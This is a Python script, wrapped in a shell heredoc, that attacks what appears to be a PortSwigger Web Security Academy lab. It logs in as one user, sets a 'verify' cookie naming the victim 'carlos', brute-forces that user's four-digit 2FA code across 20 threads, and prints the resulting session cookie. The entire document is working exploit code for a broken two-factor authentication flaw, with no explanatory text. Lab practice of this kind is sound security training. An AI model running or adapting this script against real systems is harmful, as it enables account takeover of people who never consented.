python3 - <<'EOF'
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

base_url = "https://0a3b00a903bb51198131113200da00de.web-security-academy.net"

# Step 1 — Log in as wiener to get valid session
session = requests.Session()
r = session.post(
    f"{base_url}/login",
    data={"username": "wiener", "password": "peter"},
    allow_redirects=False
)
session_cookie = r.cookies.get("session")
print(f"[+] Got session: {session_cookie}")

# Step 2 — Hit /login2 with verify=carlos to prime carlos's 2FA
r = session.get(
    f"{base_url}/login2",
    cookies={"session": session_cookie, "verify": "carlos"},
    allow_redirects=False
)
print(f"[+] Primed carlos 2FA page: {r.status_code}")

# Step 3 — Brute force 4-digit code
found = threading.Event()
result = {}

def try_code(code):
    if found.is_set():
        return None
    mfa = f"{code:04d}"
    r = requests.post(
        f"{base_url}/login2",
        data={"mfa-code": mfa},
        cookies={"session": session_cookie, "verify": "carlos"},
        allow_redirects=False
    )
    if r.status_code == 302:
        found.set()
        result["code"] = mfa
        return f"[FOUND] Code: {mfa}"
    return None

print("[*] Brute forcing 2FA code 0000-9999...")
with ThreadPoolExecutor(max_workers=20) as ex:
    futures = {ex.submit(try_code, i): i for i in range(10000)}
    for f in as_completed(futures):
        r = f.result()
        if r:
            print(r)
            break

if "code" in result:
    print(f"\n[*] Logging in as carlos with code: {result['code']}")
    final = requests.post(
        f"{base_url}/login2",
        data={"mfa-code": result["code"]},
        cookies={"session": session_cookie, "verify": "carlos"},
        allow_redirects=False
    )
    print(f"Final status: {final.status_code}")
    print(f"Location: {final.headers.get('Location', 'none')}")
    new_session = final.cookies.get("session", "check manually")
    print(f"New session cookie: {new_session}")
EOF
